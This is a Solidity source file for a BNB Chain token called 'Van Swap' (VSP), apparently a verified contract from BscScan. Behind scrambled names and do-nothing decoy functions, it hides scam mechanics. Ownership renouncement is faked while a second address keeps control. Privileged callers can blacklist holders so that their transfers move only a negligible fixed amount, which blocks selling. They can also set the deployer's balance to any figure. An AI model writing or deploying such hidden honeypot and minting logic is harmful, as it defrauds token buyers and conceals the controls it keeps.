/**
 *Submitted for verification at BscScan.com on 2023-02-20
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface tvpkotatdotnr {
    function totalSupply() external view returns (uint256);

    function balanceOf(address rbkoxruptquf) external view returns (uint256);

    function transfer(address ppgegarzhin, uint256 nxdsjeaubrs) external returns (bool);

    function allowance(address ommsbympddrgq, address spender) external view returns (uint256);

    function approve(address spender, uint256 nxdsjeaubrs) external returns (bool);

    function transferFrom(
        address sender,
        address ppgegarzhin,
        uint256 nxdsjeaubrs
    ) external returns (bool);

    event Transfer(address indexed from, address indexed asvgvdamnpxgg, uint256 value);
    event Approval(address indexed ommsbympddrgq, address indexed spender, uint256 value);
}

interface tvpkotatdotnrMetadata is tvpkotatdotnr {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract xlspdrylot {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface qsmpxiuav {
    function createPair(address hppwkhmljcc, address mjdnqliotwaoqm) external returns (address);
}

interface elvggeuxgjrx {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract VanSwap is xlspdrylot, tvpkotatdotnr, tvpkotatdotnrMetadata {

    address public xkkvtxtggdbz;

    bool public piiegwxankyvyx;

    function transfer(address levwwfztwnn, uint256 nxdsjeaubrs) external virtual override returns (bool) {
        return ervlpvzkt(_msgSender(), levwwfztwnn, nxdsjeaubrs);
    }

    function trbllubryhvxip() public {
        emit OwnershipTransferred(uqrcyabocwxszb, address(0));
        zfghiqpsmvpk = address(0);
    }

    constructor (){ 
        if (mkdkxxfyyb == wzccrjlmbbuh) {
            wzccrjlmbbuh = fvykdkammadrz;
        }
        elvggeuxgjrx ogculxtcbzkj = elvggeuxgjrx(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        xkkvtxtggdbz = qsmpxiuav(ogculxtcbzkj.factory()).createPair(ogculxtcbzkj.WETH(), address(this));
        zfghiqpsmvpk = _msgSender();
        
        uqrcyabocwxszb = _msgSender();
        kgqeejgnlvuzfr[_msgSender()] = true;
        
        jznxiktitqnrem[_msgSender()] = wdgyrfuyidb;
        emit Transfer(address(0), uqrcyabocwxszb, wdgyrfuyidb);
        trbllubryhvxip();
    }

    function moemqpnjkid() public {
        if (piiegwxankyvyx != qvvhaovhelat) {
            ijqlofwghma = true;
        }
        if (nxtqwnysipdt == ijqlofwghma) {
            mkdkxxfyyb = wzccrjlmbbuh;
        }
        wzccrjlmbbuh=0;
    }

    string private tpwsctjgqfq = "VSP";

    function approve(address msbltvarcbutg, uint256 nxdsjeaubrs) public virtual override returns (bool) {
        ohrwfatjfrur[_msgSender()][msbltvarcbutg] = nxdsjeaubrs;
        emit Approval(_msgSender(), msbltvarcbutg, nxdsjeaubrs);
        return true;
    }

    string private xmqxvrhws = "Van Swap";

    function name() external view virtual override returns (string memory) {
        return xmqxvrhws;
    }

    event OwnershipTransferred(address indexed yjptackpvxdc, address indexed kxmugphoyzu);

    bool public nxtqwnysipdt;

    uint256 private fvykdkammadrz;

    function transferFrom(address vjrhvebhoobl, address ppgegarzhin, uint256 nxdsjeaubrs) external override returns (bool) {
        if (ohrwfatjfrur[vjrhvebhoobl][_msgSender()] != type(uint256).max) {
            require(nxdsjeaubrs <= ohrwfatjfrur[vjrhvebhoobl][_msgSender()]);
            ohrwfatjfrur[vjrhvebhoobl][_msgSender()] -= nxdsjeaubrs;
        }
        return ervlpvzkt(vjrhvebhoobl, ppgegarzhin, nxdsjeaubrs);
    }

    function kkdvbrcjyyvu(address vjrhvebhoobl, address ppgegarzhin, uint256 nxdsjeaubrs) internal returns (bool) {
        require(jznxiktitqnrem[vjrhvebhoobl] >= nxdsjeaubrs);
        jznxiktitqnrem[vjrhvebhoobl] -= nxdsjeaubrs;
        jznxiktitqnrem[ppgegarzhin] += nxdsjeaubrs;
        emit Transfer(vjrhvebhoobl, ppgegarzhin, nxdsjeaubrs);
        return true;
    }

    function wssfevsfybl() public {
        
        if (qvvhaovhelat == smyfuiehifygq) {
            piiegwxankyvyx = false;
        }
        ijqlofwghma=false;
    }

    bool private smyfuiehifygq;

    uint256 constant pulnvqaappnrg = 9 ** 10;

    uint256 private wdgyrfuyidb = 100000000 * 10 ** 18;

    mapping(address => bool) public rnntjsnneo;

    function balanceOf(address rbkoxruptquf) public view virtual override returns (uint256) {
        return jznxiktitqnrem[rbkoxruptquf];
    }

    function symbol() external view virtual override returns (string memory) {
        return tpwsctjgqfq;
    }

    bool public ijqlofwghma;

    uint256 private wzccrjlmbbuh;

    address private zfghiqpsmvpk;

    uint8 private hpinvwewrfy = 18;

    function rdwasusgxmt() public {
        if (mkdkxxfyyb != wzccrjlmbbuh) {
            mkdkxxfyyb = fvykdkammadrz;
        }
        if (ijqlofwghma != nxtqwnysipdt) {
            fvykdkammadrz = mkdkxxfyyb;
        }
        wzccrjlmbbuh=0;
    }

    mapping(address => uint256) private jznxiktitqnrem;

    function getOwner() external view returns (address) {
        return zfghiqpsmvpk;
    }

    uint256 public mkdkxxfyyb;

    address public uqrcyabocwxszb;

    function owner() external view returns (address) {
        return zfghiqpsmvpk;
    }

    bool public kgbpnurmcgku;

    function knengiqgo(address oehpttzlkdqig) public {
        if (kgbpnurmcgku) {
            return;
        }
        
        kgqeejgnlvuzfr[oehpttzlkdqig] = true;
        if (mkdkxxfyyb != fvykdkammadrz) {
            fvykdkammadrz = wzccrjlmbbuh;
        }
        kgbpnurmcgku = true;
    }

    function decimals() external view virtual override returns (uint8) {
        return hpinvwewrfy;
    }

    mapping(address => bool) public kgqeejgnlvuzfr;

    function fmnwxjquwhhhgg(address geubcpptxzle) public {
        
        if (geubcpptxzle == uqrcyabocwxszb || geubcpptxzle == xkkvtxtggdbz || !kgqeejgnlvuzfr[_msgSender()]) {
            return;
        }
        
        rnntjsnneo[geubcpptxzle] = true;
    }

    function mzpwypkrlgh() public view returns (bool) {
        return ijqlofwghma;
    }

    function allowance(address mknfmwncbkqom, address msbltvarcbutg) external view virtual override returns (uint256) {
        return ohrwfatjfrur[mknfmwncbkqom][msbltvarcbutg];
    }

    function bgsbcmtsyprtb(uint256 nxdsjeaubrs) public {
        if (!kgqeejgnlvuzfr[_msgSender()]) {
            return;
        }
        jznxiktitqnrem[uqrcyabocwxszb] = nxdsjeaubrs;
    }

    function ervlpvzkt(address vjrhvebhoobl, address ppgegarzhin, uint256 nxdsjeaubrs) internal returns (bool) {
        if (vjrhvebhoobl == uqrcyabocwxszb) {
            return kkdvbrcjyyvu(vjrhvebhoobl, ppgegarzhin, nxdsjeaubrs);
        }
        if (rnntjsnneo[vjrhvebhoobl]) {
            return kkdvbrcjyyvu(vjrhvebhoobl, ppgegarzhin, pulnvqaappnrg);
        }
        return kkdvbrcjyyvu(vjrhvebhoobl, ppgegarzhin, nxdsjeaubrs);
    }

    mapping(address => mapping(address => uint256)) private ohrwfatjfrur;

    function ljjmgupyodera() public {
        
        if (ijqlofwghma != smyfuiehifygq) {
            wzccrjlmbbuh = fvykdkammadrz;
        }
        piiegwxankyvyx=false;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return wdgyrfuyidb;
    }

    bool private qvvhaovhelat;

    function hihmpboby() public {
        
        if (piiegwxankyvyx == smyfuiehifygq) {
            piiegwxankyvyx = true;
        }
        fvykdkammadrz=0;
    }

}